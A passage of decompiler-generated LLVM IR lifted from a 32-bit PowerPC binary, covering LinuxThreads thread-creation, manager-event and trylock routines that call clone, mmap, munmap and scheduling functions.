  %v1_10016354 = load i32, i32* @r10, align 4
  %v2_10016354 = add i32 %v1_10016354, 4
  %v3_10016354 = inttoptr i32 %v2_10016354 to i32*
  store i32 %v0_10016354, i32* %v3_10016354, align 4
  %v0_10016358 = load i32, i32* %r27.global-to-local, align 4
  %v1_10016358 = load i32, i32* @r10, align 4
  %v2_10016358 = add i32 %v1_10016358, 12
  %v3_10016358 = inttoptr i32 %v2_10016358 to i32*
  store i32 %v0_10016358, i32* %v3_10016358, align 4
  %v0_1001635c = load i32, i32* @r31, align 4
  %v1_1001635c = load i32, i32* @r10, align 4
  %v2_1001635c = add i32 %v1_1001635c, 8
  %v3_1001635c = inttoptr i32 %v2_1001635c to i32*
  store i32 %v0_1001635c, i32* %v3_1001635c, align 4
  %v0_10016360 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016360 = load i32, i32* @r31, align 4
  %v2_10016360 = add i32 %v1_10016360, 228
  %v3_10016360 = inttoptr i32 %v2_10016360 to i32*
  store i32 %v0_10016360, i32* %v3_10016360, align 4
  %v0_10016364 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10016364, label %dec_label_pc_100163c8, label %dec_label_pc_10016368

dec_label_pc_10016368:                            ; preds = %dec_label_pc_100162c8
  %v0_10016368 = load i32, i32* @r30, align 4
  %v1_10016368 = inttoptr i32 %v0_10016368 to i32*
  %v2_10016368 = load i32, i32* %v1_10016368, align 4
  store i32 %v2_10016368, i32* %r0.global-to-local, align 4
  %v1_1001636c = trunc i32 %v2_10016368 to i8
  %v2_1001636c = load i32, i32* @r31, align 4
  %v3_1001636c = add i32 %v2_1001636c, 45
  %v4_1001636c = inttoptr i32 %v3_1001636c to i8*
  store i8 %v1_1001636c, i8* %v4_1001636c, align 1
  %v0_10016370 = load i32, i32* @r30, align 4
  %v1_10016370 = add i32 %v0_10016370, 24
  %v2_10016370 = inttoptr i32 %v1_10016370 to i32*
  %v3_10016370 = load i32, i32* %v2_10016370, align 4
  store i32 %v3_10016370, i32* %r0.global-to-local, align 4
  %v1_10016374 = load i32, i32* @r31, align 4
  %v2_10016374 = add i32 %v1_10016374, 392
  %v3_10016374 = inttoptr i32 %v2_10016374 to i32*
  store i32 %v3_10016370, i32* %v3_10016374, align 4
  %v0_10016378 = load i32, i32* @r30, align 4
  %v1_10016378 = add i32 %v0_10016378, 12
  %v2_10016378 = inttoptr i32 %v1_10016378 to i32*
  %v3_10016378 = load i32, i32* %v2_10016378, align 4
  store i32 %v3_10016378, i32* %r0.global-to-local, align 4
  %v3_1001637c = icmp eq i32 %v3_10016378, 0
  store i1 %v3_1001637c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001637c, label %dec_label_pc_100163a8, label %dec_label_pc_10016384

dec_label_pc_10016384:                            ; preds = %dec_label_pc_10016368
  %v3_10016384 = icmp eq i32 %v3_10016378, 1
  store i1 %v3_10016384, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016384, label %dec_label_pc_1001638c, label %dec_label_pc_100163c0

dec_label_pc_1001638c:                            ; preds = %dec_label_pc_10016384
  %v1_1001638c = add i32 %v0_10016378, 4
  %v2_1001638c = inttoptr i32 %v1_1001638c to i32*
  %v3_1001638c = load i32, i32* %v2_1001638c, align 4
  store i32 %v3_1001638c, i32* %r0.global-to-local, align 4
  %v0_10016390 = load i32, i32* @r31, align 4
  %v1_10016390 = add i32 %v0_10016390, 232
  store i32 %v1_10016390, i32* @r3, align 4
  %v1_10016394 = add i32 %v0_10016378, 8
  store i32 %v1_10016394, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v2_1001639c = add i32 %v0_10016390, 228
  %v3_1001639c = inttoptr i32 %v2_1001639c to i32*
  store i32 %v3_1001638c, i32* %v3_1001639c, align 4
  store i32 ptrtoint (i32* @global_var_100163a4.1071 to i32), i32* @lr, align 4
  %v0_100163a0 = call i32 @memcpy()
  store i32 %v0_100163a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100163c0

dec_label_pc_100163a8:                            ; preds = %dec_label_pc_10016368
  %v0_100163a8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100163a8, i32* %r3.global-to-local, align 4
  store i32 268526512, i32* @lr, align 4
  %v1_100163ac = call i32 @sched_getscheduler(i32 %v0_100163a8)
  %v0_100163b0 = load i32, i32* @r31, align 4
  %v1_100163b0 = add i32 %v0_100163b0, 232
  store i32 %v1_100163b0, i32* %r4.global-to-local, align 4
  %v2_100163b4 = add i32 %v0_100163b0, 228
  %v3_100163b4 = inttoptr i32 %v2_100163b4 to i32*
  store i32 %v1_100163ac, i32* %v3_100163b4, align 4
  %v0_100163b8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100163b8, i32* %r3.global-to-local, align 4
  store i32 268526528, i32* @lr, align 4
  %v2_100163bc = call i32 @sched_getparam(i32 %v0_100163b8, i32 %v1_100163b0)
  store i32 %v2_100163bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100163c0

dec_label_pc_100163c0:                            ; preds = %dec_label_pc_10016384, %dec_label_pc_1001638c, %dec_label_pc_100163a8
  %v0_100163c0 = load i32, i32* @r31, align 4
  %v1_100163c0 = add i32 %v0_100163c0, 232
  %v2_100163c0 = inttoptr i32 %v1_100163c0 to i32*
  %v3_100163c0 = load i32, i32* %v2_100163c0, align 4
  store i32 %v3_100163c0, i32* %r0.global-to-local, align 4
  %v2_100163c4 = add i32 %v0_100163c0, 24
  %v3_100163c4 = inttoptr i32 %v2_100163c4 to i32*
  store i32 %v3_100163c0, i32* %v3_100163c4, align 4
  br label %dec_label_pc_100163c8

dec_label_pc_100163c8:                            ; preds = %dec_label_pc_100162c8, %dec_label_pc_100163c0
  %v0_100163c8 = load i32, i32* %r20.global-to-local, align 4
  %v1_100163c8 = load i32, i32* @r31, align 4
  %v2_100163c8 = add i32 %v1_100163c8, 92
  %v3_100163c8 = inttoptr i32 %v2_100163c8 to i32*
  store i32 %v0_100163c8, i32* %v3_100163c8, align 4
  store i32 %v2_100163cc, i32* @r4, align 4
  %v0_100163d0 = load i32, i32* %r19.global-to-local, align 4
  %v1_100163d0 = load i32, i32* @r31, align 4
  %v2_100163d0 = add i32 %v1_100163d0, 96
  %v3_100163d0 = inttoptr i32 %v2_100163d0 to i32*
  store i32 %v0_100163d0, i32* %v3_100163d0, align 4
  store i32 128, i32* @r5, align 4
  %v0_100163d8 = load i32, i32* @r31, align 4
  %v1_100163d8 = add i32 %v0_100163d8, 100
  store i32 %v1_100163d8, i32* @r3, align 4
  store i32 268526560, i32* @lr, align 4
  %v0_100163dc = call i32 @memcpy()
  store i32 %v0_100163dc, i32* %r3.global-to-local, align 4
  %v0_100163e0 = load i32, i32* @r31, align 4
  %v1_100163e0 = add i32 %v0_100163e0, 24
  %v2_100163e0 = inttoptr i32 %v1_100163e0 to i32*
  %v3_100163e0 = load i32, i32* %v2_100163e0, align 4
  store i32 %v3_100163e0, i32* %r3.global-to-local, align 4
  store i32 268526568, i32* @lr, align 4
  %v1_100163e4 = call i32 @__pthread_manager_adjust_prio(i32 %v3_100163e0)
  store i32 %v1_100163e4, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r11.global-to-local, align 4
  %v3_100163ec = load i32, i32* @global_var_100450c0, align 4
  %v0_100163f0 = load i32, i32* %r18.global-to-local, align 4
  %v3_100163f0 = icmp eq i32 %v0_100163f0, 0
  store i1 %v3_100163f0, i1* %cr7_eq.global-to-local, align 1
  %v1_100163f4 = load i32, i32* @r31, align 4
  %v2_100163f4 = add i32 %v1_100163f4, 4
  %v3_100163f4 = inttoptr i32 %v2_100163f4 to i32*
  store i32 %v3_100163ec, i32* %v3_100163f4, align 4
  %v3_100163f8 = load i32, i32* @global_var_100450c0, align 4
  store i32 %v3_100163f8, i32* %r0.global-to-local, align 4
  %v1_10016400 = load i32, i32* @r31, align 4
  %v2_10016400 = inttoptr i32 %v1_10016400 to i32*
  store i32 %v3_100163f8, i32* %v2_10016400, align 4
  %v3_10016404 = load i32, i32* @global_var_100450c0, align 4
  %v0_1001640c = load i32, i32* @r31, align 4
  %v2_1001640c = add i32 %v3_10016404, 4
  %v3_1001640c = inttoptr i32 %v2_1001640c to i32*
  store i32 %v0_1001640c, i32* %v3_1001640c, align 4
  %v3_10016410 = load i32, i32* @global_var_100450c0, align 4
  store i32 %v3_10016410, i32* %r9.global-to-local, align 4
  %v0_10016414 = load i32, i32* @r31, align 4
  %v2_10016414 = inttoptr i32 %v3_10016410 to i32*
  store i32 %v0_10016414, i32* %v2_10016414, align 4
  br i1 %v3_100163f0, label %dec_label_pc_1001649c, label %dec_label_pc_1001641c

dec_label_pc_1001641c:                            ; preds = %dec_label_pc_100163c8
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016420 = load i32, i32* @global_var_100451f0.1009, align 4
  store i32 %v3_10016420, i32* %r0.global-to-local, align 4
  %v0_10016424 = load i32, i32* %r23.global-to-local, align 4
  %v1_10016424 = add i32 %v0_10016424, 416
  %v2_10016424 = inttoptr i32 %v1_10016424 to i32*
  %v3_10016424 = load i32, i32* %v2_10016424, align 4
  %v2_10016428 = or i32 %v3_10016424, %v3_10016420
  store i32 %v2_10016428, i32* %r0.global-to-local, align 4
  %v1_1001642c = and i32 %v2_10016428, 128
  store i32 %v1_1001642c, i32* %r9.global-to-local, align 4
  %v3_1001642c = icmp eq i32 %v1_1001642c, 0
  br i1 %v3_1001642c, label %dec_label_pc_1001649c, label %dec_label_pc_10016434

dec_label_pc_10016434:                            ; preds = %dec_label_pc_1001641c
  %v0_10016434 = load i32, i32* @r31, align 4
  %v1_10016434 = add i32 %v0_10016434, 28
  %v2_10016434 = inttoptr i32 %v1_10016434 to i32*
  %v3_10016434 = load i32, i32* %v2_10016434, align 4
  store i32 %v3_10016434, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268526656, i32* @lr, align 4
  %v0_1001643c = call i32 @__pthread_lock()
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016444 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 268524896, i32* %r3.global-to-local, align 4
  %v0_10016450 = load i32, i32* @r31, align 4
  store i32 %v0_10016450, i32* %r4.global-to-local, align 4
  store i32 %v0_10016450, i32* %r6.global-to-local, align 4
  %v1_10016458 = or i32 %v3_10016444, 3840
  store i32 268526692, i32* @lr, align 4
  %v4_10016460 = call i32 @clone(i32 268524896, i32 %v0_10016450, i32 %v1_10016458, i32 %v0_10016450)
  store i32 %v4_10016460, i32* @r3, align 4
  %v3_10016464 = icmp eq i32 %v4_10016460, -1
  store i1 %v3_10016464, i1* %cr7_eq.global-to-local, align 1
  store i32 %v4_10016460, i32* %r29.global-to-local, align 4
  br i1 %v3_10016464, label %dec_label_pc_100164c4.thread, label %dec_label_pc_10016494

dec_label_pc_100164c4.thread:                     ; preds = %dec_label_pc_10016434
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100164cc

dec_label_pc_10016494:                            ; preds = %dec_label_pc_10016434
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v1_10016478 = load i32, i32* @r31, align 4
  %v2_10016478 = add i32 %v1_10016478, 424
  %v3_10016478 = inttoptr i32 %v2_10016478 to i32*
  store i32 8, i32* %v3_10016478, align 4
  %v0_1001647c = load i32, i32* @r31, align 4
  %v2_1001647c = add i32 %v0_1001647c, 428
  %v3_1001647c = inttoptr i32 %v2_1001647c to i32*
  store i32 %v0_1001647c, i32* %v3_1001647c, align 4
  %v0_10016480 = load i32, i32* @r31, align 4
  store i32 %v0_10016480, i32* @global_var_100451f8.1017, align 4
  %v2_10016484 = add i32 %v0_10016480, 20
  %v3_10016484 = inttoptr i32 %v2_10016484 to i32*
  store i32 %v4_10016460, i32* %v3_10016484, align 4
  %v1_10016488 = call i32 @__linuxthreads_create_event(i32 268697600)
  store i32 %v1_10016488, i32* %r3.global-to-local, align 4
  %v0_1001648c = load i32, i32* @r31, align 4
  %v1_1001648c = add i32 %v0_1001648c, 28
  %v2_1001648c = inttoptr i32 %v1_1001648c to i32*
  %v3_1001648c = load i32, i32* %v2_1001648c, align 4
  store i32 %v3_1001648c, i32* @r3, align 4
  store i32 268526740, i32* @lr, align 4
  %v0_10016490 = call i32 @__pthread_unlock()
  store i32 %v0_10016490, i32* %r3.global-to-local, align 4
  %v0_10016494.pr = load i32, i32* %r29.global-to-local, align 4
  %v3_10016494 = icmp eq i32 %v0_10016494.pr, 0
  store i1 %v3_10016494, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016494, label %dec_label_pc_1001649c, label %dec_label_pc_100164c4

dec_label_pc_1001649c:                            ; preds = %dec_label_pc_10016494, %dec_label_pc_1001641c, %dec_label_pc_100163c8
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100164a4 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 268524664, i32* %r3.global-to-local, align 4
  %v0_100164ac = load i32, i32* @r31, align 4
  store i32 %v0_100164ac, i32* %r4.global-to-local, align 4
  store i32 %v0_100164ac, i32* %r6.global-to-local, align 4
  %v1_100164b4 = or i32 %v3_100164a4, 3840
  store i32 268526784, i32* @lr, align 4
  %v4_100164bc = call i32 @clone(i32 268524664, i32 %v0_100164ac, i32 %v1_100164b4, i32 %v0_100164ac)
  store i32 %v4_100164bc, i32* %r3.global-to-local, align 4
  store i32 %v4_100164bc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100164c4

dec_label_pc_100164c4:                            ; preds = %dec_label_pc_10016494, %dec_label_pc_1001649c
  %v0_10016560 = phi i32 [ %v4_100164bc, %dec_label_pc_1001649c ], [ %v0_10016494.pr, %dec_label_pc_10016494 ]
  %v3_100164c4 = icmp eq i32 %v0_10016560, -1
  store i1 %v3_100164c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100164c4, label %dec_label_pc_100164cc, label %dec_label_pc_10016560

dec_label_pc_100164cc:                            ; preds = %dec_label_pc_100164c4.thread, %dec_label_pc_100164c4
  %v0_100164cc = load i32, i32* @r31, align 4
  %v1_100164cc = inttoptr i32 %v0_100164cc to i32*
  %v2_100164cc = load i32, i32* %v1_100164cc, align 4
  store i32 %v2_100164cc, i32* %r11.global-to-local, align 4
  %v0_100164d0 = load i32, i32* @r30, align 4
  %v3_100164d0 = icmp eq i32 %v0_100164d0, 0
  store i1 %v3_100164d0, i1* %cr7_eq.global-to-local, align 1
  %v1_100164d4 = add i32 %v0_100164cc, 4
  %v2_100164d4 = inttoptr i32 %v1_100164d4 to i32*
  %v3_100164d4 = load i32, i32* %v2_100164d4, align 4
  store i32 %v3_100164d4, i32* %r0.global-to-local, align 4
  %v2_100164d8 = add i32 %v2_100164cc, 4
  %v3_100164d8 = inttoptr i32 %v2_100164d8 to i32*
  store i32 %v3_100164d4, i32* %v3_100164d8, align 4
  %v0_100164dc = load i32, i32* @r31, align 4
  %v1_100164dc = add i32 %v0_100164dc, 4
  %v2_100164dc = inttoptr i32 %v1_100164dc to i32*
  %v3_100164dc = load i32, i32* %v2_100164dc, align 4
  store i32 %v3_100164dc, i32* %r9.global-to-local, align 4
  %v0_100164e0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100164e0 = inttoptr i32 %v3_100164dc to i32*
  store i32 %v0_100164e0, i32* %v2_100164e0, align 4
  br i1 %v3_100164d0, label %dec_label_pc_100164f4, label %dec_label_pc_100164e8

dec_label_pc_100164e8:                            ; preds = %dec_label_pc_100164cc
  %v0_100164e8 = load i32, i32* @r30, align 4
  %v1_100164e8 = add i32 %v0_100164e8, 24
  %v2_100164e8 = inttoptr i32 %v1_100164e8 to i32*
  %v3_100164e8 = load i32, i32* %v2_100164e8, align 4
  store i32 %v3_100164e8, i32* %r0.global-to-local, align 4
  %v3_100164ec = icmp eq i32 %v3_100164e8, 0
  store i1 %v3_100164ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100164ec, label %dec_label_pc_100164f4, label %dec_label_pc_10016520

dec_label_pc_100164f4:                            ; preds = %dec_label_pc_100164e8, %dec_label_pc_100164cc
  %v0_100164f4 = load i32, i32* @r31, align 4
  %v1_100164f4 = add i32 %v0_100164f4, 400
  %v2_100164f4 = inttoptr i32 %v1_100164f4 to i32*
  %v3_100164f4 = load i32, i32* %v2_100164f4, align 4
  store i32 %v3_100164f4, i32* %r4.global-to-local, align 4
  %v3_100164f8 = icmp eq i32 %v3_100164f4, 0
  store i1 %v3_100164f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100164f8, label %dec_label_pc_10016508, label %dec_label_pc_10016500

dec_label_pc_10016500:                            ; preds = %dec_label_pc_100164f4
  %v1_10016500 = add i32 %v0_100164f4, 396
  %v2_10016500 = inttoptr i32 %v1_10016500 to i32*
  %v3_10016500 = load i32, i32* %v2_10016500, align 4
  store i32 %v3_10016500, i32* %r3.global-to-local, align 4
  store i32 268526856, i32* @lr, align 4
  %v2_10016504 = call i32 @munmap(i32 %v3_10016500, i32 %v3_100164f4)
  store i32 %v2_10016504, i32* %r3.global-to-local, align 4
  %v1_10016514.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10016508

dec_label_pc_10016508:                            ; preds = %dec_label_pc_100164f4, %dec_label_pc_10016500
  %v1_10016514 = phi i32 [ %v0_100164f4, %dec_label_pc_100164f4 ], [ %v1_10016514.pre, %dec_label_pc_10016500 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001650c = load i32, i32* @global_var_10045234.1005, align 4
  %v1_10016510 = mul i32 %v3_1001650c, 4
  store i32 %v1_10016510, i32* %r4.global-to-local, align 4
  %v2_10016514 = sub i32 %v1_10016514, %v1_10016510
  %v1_10016518 = add i32 %v2_10016514, 480
  store i32 %v1_10016518, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016520.1072 to i32), i32* @lr, align 4
  %v2_1001651c = call i32 @munmap(i32 %v1_10016518, i32 %v1_10016510)
  store i32 %v2_1001651c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016520

dec_label_pc_10016520:                            ; preds = %dec_label_pc_100164e8, %dec_label_pc_10016508
  store i32 268697600, i32* %r8.global-to-local, align 4
  %v3_10016528 = load i32, i32* @global_var_10045100.1058, align 4
  store i32 ptrtoint (i32* @global_var_10040d40.1024 to i32), i32* %r9.global-to-local, align 4
  %v0_10016530 = load i32, i32* %r24.global-to-local, align 4
  %v1_10016530 = mul i32 %v0_10016530, 16
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10016538 = add i32 %v1_10016530, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %v2_10016538, i32* %r11.global-to-local, align 4
  %v1_1001653c = add i32 %v3_10016528, -1
  store i32 %v1_1001653c, i32* %r10.global-to-local, align 4
  %v2_10016540 = add i32 %v1_10016530, add (i32 ptrtoint (i32* @global_var_10040d40.1024 to i32), i32 12)
  %v3_10016540 = inttoptr i32 %v2_10016540 to i32*
  store i32 0, i32* %v3_10016540, align 4
  %v0_10016544 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10016544, i32* @global_var_10045100.1058, align 4
  %v0_10016548 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016548 = load i32, i32* %r11.global-to-local, align 4
  %v2_10016548 = add i32 %v1_10016548, 8
  %v3_10016548 = inttoptr i32 %v2_10016548 to i32*
  store i32 %v0_10016548, i32* %v3_10016548, align 4
  %v0_1001654c = call i32 @__errno_location()
  store i32 %v0_1001654c, i32* %r3.global-to-local, align 4
  %v1_10016550 = inttoptr i32 %v0_1001654c to i32*
  %v2_10016550 = load i32, i32* %v1_10016550, align 4
  store i32 %v2_10016550, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001656c

dec_label_pc_10016558:                            ; preds = %dec_label_pc_100162c0
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001656c

dec_label_pc_10016560:                            ; preds = %dec_label_pc_100164c4
  %v1_10016560 = load i32, i32* @r31, align 4
  %v2_10016560 = add i32 %v1_10016560, 20
  %v3_10016560 = inttoptr i32 %v2_10016560 to i32*
  store i32 %v0_10016560, i32* %v3_10016560, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10016568 = load i32, i32* %r28.global-to-local, align 4
  %v1_10016568 = load i32, i32* %r23.global-to-local, align 4
  %v2_10016568 = add i32 %v1_10016568, 48
  %v3_10016568 = inttoptr i32 %v2_10016568 to i32*
  store i32 %v0_10016568, i32* %v3_10016568, align 4
  %v0_1001656c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001656c

dec_label_pc_1001656c:                            ; preds = %dec_label_pc_10016188, %dec_label_pc_10016558, %dec_label_pc_10016520, %dec_label_pc_10016560
  %v0_1001656c = phi i32 [ 1, %dec_label_pc_10016188 ], [ 11, %dec_label_pc_10016558 ], [ %v2_10016550, %dec_label_pc_10016520 ], [ %v0_1001656c.pre, %dec_label_pc_10016560 ]
  %v1_1001656c = load i32, i32* %r23.global-to-local, align 4
  %v2_1001656c = add i32 %v1_1001656c, 52
  %v3_1001656c = inttoptr i32 %v2_1001656c to i32*
  store i32 %v0_1001656c, i32* %v3_1001656c, align 4
  %v3_10016570 = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_10016570, i32* @r3, align 4
  br label %dec_label_pc_1001667c

dec_label_pc_1001667c:                            ; preds = %dec_label_pc_100160dc, %dec_label_pc_1001656c
  store i32 268527232, i32* @lr, align 4
  %v0_1001667c = call i32 @restart.4()
  store i32 %v0_1001667c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100160bc

; uselistorder directives
  uselistorder i32 %v1_10016530, { 1, 0 }
  uselistorder i32 %v1_10016510, { 2, 1, 0 }
  uselistorder i32 %v0_1001647c, { 1, 0 }
  uselistorder i32 %v0_10016348, { 1, 0 }
  uselistorder i32 %v1_100162f4, { 1, 0 }
  uselistorder i32 %v1_100162c0, { 2, 3, 1, 0 }
  uselistorder i32 %v3_10016288, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1001625c, { 2, 1, 0 }
  uselistorder i32 %v1_10016254, { 1, 0, 2 }
  uselistorder i32 %v2_1001624c, { 1, 0 }
  uselistorder i32 %v2_10016228, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10016210, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10016210, { 1, 0, 2 }
  uselistorder i32 %v3_100161dc, { 1, 0, 2 }
  uselistorder i1 %v3_100161c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100161c0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_100161a8, { 1, 0 }
  uselistorder i32 %v0_10016248, { 2, 0, 1 }
  uselistorder i32 %v2_10016008, { 3, 2, 1, 0, 5, 4, 7, 6, 9, 8 }
  uselistorder i32* %stack_var_-360, { 1, 0 }
  uselistorder i32 %tmp16, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 21, 22, 23, 19, 20, 24, 25, 26, 28, 27 }
  uselistorder i32* %r3.global-to-local, { 28, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 27, 31, 32, 33, 29, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 0 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r26.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r25.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 31, 21, 22, 23, 24, 26, 25, 20, 28, 27, 29, 30 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 3, 4, 32, 5, 6, 7, 8, 9, 10, 19, 11, 12, 13, 14, 15, 16, 17, 18, 33, 31, 30, 29, 21, 22, 23, 20, 24, 25, 26, 27, 28 }
  uselistorder i32 ()* @restart.4, { 1, 0 }
  uselistorder i32 (i32, i32)* @munmap, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__linuxthreads_create_event, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 3, 2, 1, 0 }
  uselistorder i32 3840, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @sched_getparam, { 1, 0 }
  uselistorder i32 (i32)* @sched_getscheduler, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 2097152, { 4, 1, 5, 2, 3, 0, 6, 7 }
  uselistorder i32 ()* @__GI_getpagesize, { 3, 2, 1, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e0a8.1068 to i32), { 0, 2, 1 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 2, 1, 0 }
  uselistorder i32* @global_var_100450c0, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_10040ae8.1061, { 1, 0 }
  uselistorder label %dec_label_pc_1001667c, { 1, 0 }
  uselistorder label %dec_label_pc_1001656c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10016520, { 1, 0 }
  uselistorder label %dec_label_pc_10016508, { 1, 0 }
  uselistorder label %dec_label_pc_100164cc, { 1, 0 }
  uselistorder label %dec_label_pc_100164c4, { 1, 0 }
  uselistorder label %dec_label_pc_100163c8, { 1, 0 }
  uselistorder label %dec_label_pc_100163c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100162c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001623c, { 1, 0 }
  uselistorder label %dec_label_pc_100161a4, { 1, 0 }
  uselistorder label %dec_label_pc_10016108, { 1, 0 }
  uselistorder label %dec_label_pc_100160bc, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_100160b0, { 1, 0 }
  uselistorder label %dec_label_pc_10016064, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  %v3_100166d4 = load i32, i32* bitcast (i32** @global_var_10040abc.1013 to i32*), align 4
  store i32 %v3_100166d4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10040aa0.1011 to i32), i32* @r2, align 4
  store i32 268527332, i32* @lr, align 4
  %v0_100166e0 = call i32 @__pthread_lock()
  %v3_100166e4 = load i32, i32* bitcast (i32** @global_var_10040abc.1013 to i32*), align 4
  store i32 %v3_100166e4, i32* @r3, align 4
  store i32 268527340, i32* @lr, align 4
  %v0_100166e8 = call i32 @__pthread_unlock()
  %v0_100166ec = load i32, i32* %r28.global-to-local, align 4
  %v1_100166f0 = call i32 @__pthread_manager(i32 %v0_100166ec)
  ret i32 %v1_100166f0

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_10040aa0.1011 to i32), { 3, 0, 6, 2, 4, 7, 1, 5, 8 }
}

define i32 @__pthread_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_100166f86 = load i32, i32* %arg1, align 4
  %v3_100166fc7 = icmp eq i32 %v2_100166f86, 0
  br i1 %v3_100166fc7, label %dec_label_pc_1001670c.lr.ph, label %dec_label_pc_10016704

dec_label_pc_1001670c.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001670c

dec_label_pc_10016704:                            ; preds = %dec_label_pc_10016720, %entry
  ret i32 16

dec_label_pc_1001670c:                            ; preds = %dec_label_pc_1001670c.lr.ph, %dec_label_pc_10016720
  %v5_10016710 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10016710, label %dec_label_pc_1001672c, label %dec_label_pc_10016720

dec_label_pc_10016720:                            ; preds = %dec_label_pc_1001670c
  %v2_100166f8 = load i32, i32* %arg1, align 4
  %v3_100166fc = icmp eq i32 %v2_100166f8, 0
  br i1 %v3_100166fc, label %dec_label_pc_1001670c, label %dec_label_pc_10016704

dec_label_pc_1001672c:                            ; preds = %dec_label_pc_1001670c
  store i32 0, i32* @r11, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001670c, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_100167386 = load i32, i32* %arg1, align 4
  %v3_1001673c7 = icmp eq i32 %v2_100167386, 0
  br i1 %v3_1001673c7, label %dec_label_pc_1001674c.lr.ph, label %dec_label_pc_10016744

dec_label_pc_1001674c.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1001674c

dec_label_pc_10016744:                            ; preds = %dec_label_pc_10016760, %entry
  ret i32 16

dec_label_pc_1001674c:                            ; preds = %dec_label_pc_1001674c.lr.ph, %dec_label_pc_10016760
  %v5_10016750 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10016750, label %dec_label_pc_1001676c, label %dec_label_pc_10016760

dec_label_pc_10016760:                            ; preds = %dec_label_pc_1001674c
  %v2_10016738 = load i32, i32* %arg1, align 4
